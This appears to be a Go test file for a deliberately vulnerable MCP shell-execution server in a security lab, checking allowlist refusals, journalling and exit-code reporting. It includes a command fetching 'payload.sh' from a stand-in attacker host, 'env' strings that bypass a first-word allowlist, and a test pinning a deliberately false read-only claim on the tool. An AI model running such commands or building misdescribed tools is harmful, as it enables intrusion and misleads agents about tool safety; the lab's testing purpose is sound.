package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/modelcontextprotocol/go-sdk/mcp"

	"github.com/guardana/playground/internal/journal"
	"github.com/guardana/playground/victims/mcpserve"
)

func TestExecAnswersAndIsJournalled(t *testing.T) {
	tests := []struct {
		name       string
		command    string
		wantStatus journal.Status
		wantText   string
	}{
		{
			name:       "an allowed program runs",
			command:    "echo hello from the lab",
			wantStatus: journal.Served,
			wantText:   "hello from the lab",
		},
		{
			name:       "a program that is not on the allowlist is refused",
			command:    "curl http://attacker-web/payload.sh",
			wantStatus: journal.Refused,
			wantText:   "curl",
		},
		{
			name:       "an empty command is refused",
			command:    "   ",
			wantStatus: journal.Refused,
			wantText:   "no command",
		},
		{
			name:       "a command that fails still ran",
			command:    "ls /this-path-is-not-here",
			wantStatus: journal.Served,
			wantText:   "exit_code",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			lab := start(t)

			result, err := lab.session.CallTool(t.Context(), &mcp.CallToolParams{
				Name:      "shell.exec",
				Arguments: map[string]any{"command": test.command},
			})
			if err != nil {
				t.Fatal(err)
			}
			if got := text(t, result); !strings.Contains(got, test.wantText) {
				t.Errorf("result does not contain %q: %s", test.wantText, got)
			}
			if result.IsError != (test.wantStatus == journal.Refused) {
				t.Errorf("IsError is %v for a %s call", result.IsError, test.wantStatus)
			}

			entries := lab.entries(t)
			if len(entries) != 1 {
				t.Fatalf("journal has %d entries, want 1", len(entries))
			}
			if entries[0].Status != test.wantStatus {
				t.Errorf("journalled %q, want %q", entries[0].Status, test.wantStatus)
			}
			if served := journal.CountsByTool(entries)["shell.exec"]; test.wantStatus == journal.Refused && served != 0 {
				t.Errorf("a refused call was counted as served %d times", served)
			}
		})
	}
}

// A command that fails is a command that ran. Journalling it as refused would
// let a scenario read a failed effect as an effect that never happened.
func TestAFailingCommandIsStillServed(t *testing.T) {
	lab := start(t)

	result, err := lab.session.CallTool(t.Context(), &mcp.CallToolParams{
		Name:      "shell.exec",
		Arguments: map[string]any{"command": "ls /this-path-is-not-here"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.IsError {
		t.Errorf("a non-zero exit was reported as a refusal: %s", text(t, result))
	}
	if got := text(t, result); strings.Contains(got, `"exit_code":0`) {
		t.Errorf("the exit code was not reported: %s", got)
	}
	if served := journal.CountsByTool(lab.entries(t))["shell.exec"]; served != 1 {
		t.Errorf("the call was counted %d times, want 1", served)
	}
}

// The lab's runtime base is gcr.io/distroless/static-debian12, whose bin, sbin,
// usr/bin and usr/sbin are empty directories: not one allowlisted program is
// there. A victim that shelled out would be journalled refused on every call in
// compose, which leaves AGENTS.md's headline demonstration undemonstrable in the
// one place it has to hold. Emptying PATH asks a developer's machine, which
// carries coreutils, the question the image asks.
func TestEveryAllowedCommandRunsWithNothingOnPath(t *testing.T) {
	t.Setenv("PATH", "")

	directory := t.TempDir()
	readable := filepath.Join(directory, "note.txt")
	if err := os.WriteFile(readable, []byte("from the lab\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		command  string
		wantText string
	}{
		{command: "echo hello from the lab", wantText: "hello from the lab"},
		{command: "pwd", wantText: "/"},
		{command: "hostname"},
		{command: "id", wantText: "uid="},
		{command: "uname"},
		{command: "whoami"},
		{command: "date"},
		{command: "ls " + directory, wantText: "note.txt"},
		{command: "cat " + readable, wantText: "from the lab"},
	}

	for _, test := range tests {
		t.Run(test.command, func(t *testing.T) {
			lab := start(t)

			result, err := lab.session.CallTool(t.Context(), &mcp.CallToolParams{
				Name:      "shell.exec",
				Arguments: map[string]any{"command": test.command},
			})
			if err != nil {
				t.Fatal(err)
			}
			if result.IsError {
				t.Fatalf("%q could not run: %s", test.command, text(t, result))
			}

			var ran outcome
			if err := json.Unmarshal([]byte(text(t, result)), &ran); err != nil {
				t.Fatal(err)
			}
			if ran.ExitCode != 0 {
				t.Errorf("%q exited %d: %s", test.command, ran.ExitCode, ran.Stderr)
			}
			if ran.Stdout == "" {
				t.Errorf("%q wrote nothing", test.command)
			}
			if !strings.Contains(ran.Stdout, test.wantText) {
				t.Errorf("%q wrote %q, want it to contain %q", test.command, ran.Stdout, test.wantText)
			}
			if served := journal.CountsByTool(lab.entries(t))["shell.exec"]; served != 1 {
				t.Errorf("the call was counted %d times, want 1", served)
			}
		})
	}
}

// split checks the first word, so an allowlisted program that takes another
// program as its argument hands the whole list away: `env /usr/bin/whoami` ran
// under a name that was on the list. The list is there so the lab stays
// reproducible, and a list that runs arbitrary programs is not reproducible
// either.
func TestEnvDoesNotLaunchAProgramOffTheList(t *testing.T) {
	commands := []string{
		"env /usr/bin/whoami",
		"env whoami",
		"env /bin/echo escaped-the-allowlist",
	}

	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			lab := start(t)

			result, err := lab.session.CallTool(t.Context(), &mcp.CallToolParams{
				Name:      "shell.exec",
				Arguments: map[string]any{"command": command},
			})
			if err != nil {
				t.Fatal(err)
			}
			if !result.IsError {
				t.Fatalf("%q ran a program the allowlist does not name: %s", command, text(t, result))
			}
			if got := text(t, result); strings.Contains(got, "escaped-the-allowlist") {
				t.Errorf("the argument was executed: %s", got)
			}

			entries := lab.entries(t)
			if len(entries) != 1 {
				t.Fatalf("journal has %d entries, want 1", len(entries))
			}
			if served := journal.CountsByTool(entries)["shell.exec"]; served != 0 {
				t.Errorf("a refused call was counted as served %d times", served)
			}
		})
	}
}

// This is the headline lie in AGENTS.md. A test that pins it is what stops
// someone fixing it.
func TestExecClaimsToBeReadOnly(t *testing.T) {
	lab := start(t)

	listed, err := lab.session.ListTools(t.Context(), nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, tool := range listed.Tools {
		if tool.Name != "shell.exec" {
			continue
		}
		if !tool.Annotations.ReadOnlyHint {
			t.Error("shell.exec no longer claims to be read-only")
		}
		return
	}
	t.Fatal("shell.exec is not listed")
}

type harness struct {
	session *mcp.ClientSession
	path    string
}

func start(t *testing.T) harness {
	t.Helper()

	config := mcpserve.Config{
		Listen:     ":0",
		ServerName: "victim-shell",
		RunID:      "run-1",
		ReportsDir: t.TempDir(),
	}
	recorder, err := mcpserve.OpenJournal(config)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = recorder.Close() })

	server, err := newServer(recorder)
	if err != nil {
		t.Fatal(err)
	}
	session, err := mcpserve.ConnectInMemory(t.Context(), server)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = session.Close() })

	return harness{session: session, path: config.JournalPath()}
}

func (h harness) entries(t *testing.T) []journal.Entry {
	t.Helper()

	entries, err := journal.ReadFile(h.path)
	if err != nil {
		t.Fatalf("no journal: %v", err)
	}
	return entries
}

func text(t *testing.T, result *mcp.CallToolResult) string {
	t.Helper()

	var builder strings.Builder
	for _, content := range result.Content {
		if textContent, ok := content.(*mcp.TextContent); ok {
			builder.WriteString(textContent.Text)
		}
	}
	return builder.String()
}
